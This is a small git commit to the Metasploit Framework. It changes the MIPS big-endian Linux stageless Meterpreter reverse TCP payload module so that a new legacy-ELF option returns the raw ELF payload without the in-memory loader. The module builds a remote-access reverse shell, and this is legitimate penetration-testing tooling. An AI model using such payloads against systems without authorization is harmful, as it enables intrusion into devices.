eaa0672b345e036a3689054a0f65a08ba4284f48
dledda-r7 <diego_ledda@rapid7.com>
2025-04-17 06:51:16 -0400

    feat: add elf-legacy option for systems unsupported by in_memory_loader

--- modules/payloads/singles/linux/mipsbe/meterpreter_reverse_tcp.rb
+++ modules/payloads/singles/linux/mipsbe/meterpreter_reverse_tcp.rb
@@ -38,6 +38,10 @@ module MetasploitModule
       stageless: true
     }.merge(mettle_logging_config)
     payload = MetasploitPayloads::Mettle.new('mips-linux-muslsf', generate_config(opts)).to_binary :exec
-    in_memory_load(payload) + payload
+    ds = opts[:datastore] || datastore
+    unless ds['MeterpreterLegacyElf']
+      return in_memory_load(payload) + payload
+    end
+    payload
   end
 end
